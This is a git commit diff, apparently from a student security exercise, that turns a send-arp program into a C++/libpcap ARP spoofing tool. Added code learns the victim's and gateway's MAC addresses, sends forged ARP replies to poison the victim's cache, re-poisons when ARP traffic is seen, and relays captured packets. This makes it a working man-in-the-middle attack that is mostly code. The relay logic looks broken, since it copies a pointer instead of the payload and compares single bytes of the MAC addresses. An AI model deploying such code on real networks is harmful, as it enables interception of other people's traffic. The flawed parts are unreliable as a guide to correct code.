2b5365c100b45d2c1a95c57c6ba546f2b7cb784d
doit-man <kjs000804@naver.com>
2020-10-28 19:02:12 +0900

    add local project

--- main.cpp
+++ main.cpp
@@ -16,6 +16,11 @@ struct EthArpPacket {
 	EthHdr eth_;
 	ArpHdr arp_;
 };
+
+struct RelayPacket {
+	EthHdr eth_;
+	const u_char *IP;
+};
 #pragma pack(pop)
 
 void usage() {
@@ -85,43 +90,112 @@ int main(int argc, char* argv[]) {
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
+		EthArpPacket req2_packet;
+
+                req2_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+                req2_packet.eth_.smac_ = my_mac_addr;
+        	
+                req2_packet.eth_.type_ = htons(EthHdr::Arp);
+
+                req2_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+                req2_packet.arp_.pro_ = htons(EthHdr::Ip4);
+                req2_packet.arp_.hln_ = Mac::SIZE;
+                req2_packet.arp_.pln_ = Ip::SIZE;
+                req2_packet.arp_.op_ = htons(ArpHdr::Request);
+                req2_packet.arp_.smac_ = my_mac_addr;
+                req2_packet.arp_.sip_ = htonl(Ip(argv[i*2 + 2]));
+                req2_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+                req2_packet.arp_.tip_ = htonl(Ip(argv[i*2 + 3]));
+
+
+                int res_ = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req2_packet), sizeof(EthArpPacket));
+                if (res_ != 0){ 
+                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                }
+		
+		EthArpPacket spf_packet;
+		uint8_t target_mac_addr[MAC_ALEN]={0,};
 		while (true){
 			struct pcap_pkthdr* header;
 			const u_char* packet;
-			EthArpPacket *rep_packet;	
+			EthArpPacket *handle_packet;	
 			int res = pcap_next_ex(handle, &header, &packet);
 			if(res == 0) continue;
 			if(res == -1||res == -2){
 				printf("pcap_next_ex return %d(%s)\n",res,pcap_geterr(handle));
 				break;
 			}
-			rep_packet = (EthArpPacket*)packet;
-			if (rep_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
-			if (rep_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
-			//printf("%02x:%02x:%02x:%02x:%02x:%02x\n",rep_packet->arp_.smac_[0],rep_packet->arp_.smac_[1],rep_packet->arp_.smac_[2],rep_packet->arp_.smac_[3],rep_packet->arp_.smac_[4],rep_packet->arp_.smac_[5]);
+			handle_packet = (EthArpPacket*)packet;
+			//first spoofing
+			if (handle_packet->eth_.type_ == htons(EthHdr::Arp)&&handle_packet->arp_.op_ == htons(ArpHdr::Reply)&& handle_packet->arp_.sip_ ==(Ip)htonl(Ip(argv[i*2 + 2]))){
+				//printf("1: %02x:%02x:%02x:%02x:%02x:%02x\n",handle_packet->arp_.smac_[0],handle_packet->arp_.smac_[1],handle_packet->arp_.smac_[2],handle_packet->arp_.smac_[3],handle_packet->arp_.smac_[4],handle_packet->arp_.smac_[5]);
 			
-			EthArpPacket spf_packet;
-	        	spf_packet.eth_.dmac_ = rep_packet->arp_.smac_ ;
-	        	spf_packet.eth_.smac_ = my_mac_addr;
-	                spf_packet.eth_.type_ = htons(EthHdr::Arp);
+	        		spf_packet.eth_.dmac_ = handle_packet->arp_.smac_ ;
+	        		spf_packet.eth_.smac_ = my_mac_addr;
+	              		spf_packet.eth_.type_ = htons(EthHdr::Arp);
 	
-	        	spf_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	        	spf_packet.arp_.pro_ = htons(EthHdr::Ip4);
-	        	spf_packet.arp_.hln_ = Mac::SIZE;
-	        	spf_packet.arp_.pln_ = Ip::SIZE;
-	        	spf_packet.arp_.op_ = htons(ArpHdr::Reply);
-	        	spf_packet.arp_.smac_ = my_mac_addr;
-	        	spf_packet.arp_.sip_ = htonl(Ip(argv[i*2 + 3]));
-	        	spf_packet.arp_.tmac_ = rep_packet->arp_.smac_ ;
-	        	spf_packet.arp_.tip_ = htonl(Ip(argv[i*2 + 2]));
+		        	spf_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+		        	spf_packet.arp_.pro_ = htons(EthHdr::Ip4);
+	        		spf_packet.arp_.hln_ = Mac::SIZE;
+	        		spf_packet.arp_.pln_ = Ip::SIZE;
+	        		spf_packet.arp_.op_ = htons(ArpHdr::Reply);
+	        		spf_packet.arp_.smac_ = my_mac_addr;
+	        		spf_packet.arp_.sip_ = htonl(Ip(argv[i*2 + 3]));
+	        		spf_packet.arp_.tmac_ = handle_packet->arp_.smac_ ;
+	        		spf_packet.arp_.tip_ = htonl(Ip(argv[i*2 + 2]));
 		
+				int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spf_packet), sizeof(EthArpPacket));
+        			
+				if (res2 != 0) {
+        	        		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        			}
+			}
+			//get target mac address
+			else if (handle_packet->eth_.type_ == htons(EthHdr::Arp)&&handle_packet->arp_.op_ == htons(ArpHdr::Reply)&& handle_packet->arp_.sip_ == (Ip)htonl(Ip(argv[i*2 + 3]))) 
+			{
+				target_mac_addr[0] = handle_packet->arp_.smac_[0];
+				target_mac_addr[1] = handle_packet->arp_.smac_[1];
+				target_mac_addr[2] = handle_packet->arp_.smac_[2];
+				target_mac_addr[3] = handle_packet->arp_.smac_[3];
+				target_mac_addr[4] = handle_packet->arp_.smac_[4];
+				target_mac_addr[5] = handle_packet->arp_.smac_[5];
+				int res__ = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spf_packet), sizeof(EthArpPacket));
+                                if (res__ != 0) {
+                                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                                }
+				//printf("catch louter MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",target_mac_addr[0],target_mac_addr[1],target_mac_addr[2],target_mac_addr[3],target_mac_addr[4],target_mac_addr[5]);
+			}
 
-        		int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spf_packet), sizeof(EthArpPacket));
-        		if (res2 != 0) {
-        	        	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-        		}
+
+			//spoofing again
+			else if (handle_packet->eth_.type_ == htons(EthHdr::Arp)&&handle_packet->arp_.sip_ ==(Ip)htonl(Ip(argv[i*2 + 2]))&&handle_packet->arp_.sip_ ==(Ip)htonl(Ip(argv[i*2 + 3]))){
+				int res3 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spf_packet), sizeof(EthArpPacket));
+                                if (res3 != 0) {
+                                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                                }		
+					
+			}
+
+
+			//relay
+			else if (*packet == *my_mac_addr && *(packet+6) == *spf_packet.eth_.dmac_)
+			{	
+				RelayPacket relay_packet;
 				
-			break;
+				printf("2: %02x:%02x:%02x:%02x:%02x:%02x\n",target_mac_addr[0],target_mac_addr[1],target_mac_addr[2],target_mac_addr[3],target_mac_addr[4],target_mac_addr[5]);
+				relay_packet.eth_.dmac_ = target_mac_addr;
+				relay_packet.eth_.smac_	= my_mac_addr;
+				relay_packet.IP = (packet+12);
+				
+
+				int res4 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relay_packet) , header->len);
+                                if (res4 != 0) {
+                                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+
+			
+				}
+			}
+			
 		}
 	}
 
--- makefile
+++ makefile
@@ -1,9 +1,9 @@
 LDLIBS=-lpcap
 
-all: report-send-arp
+all: arp-spoof
 
-send-arp-test: main.o arphdr.o ethhdr.o ip.o mac.o
+arp-spoof: main.o arphdr.o ethhdr.o ip.o mac.o
 	$(LINK.cc) $^ $(LOADLIBES) $(LDLIBS) -o $@
 
 clean:
-	rm -f send-arp-test *.o
+	rm -f arp-spoof	*.o
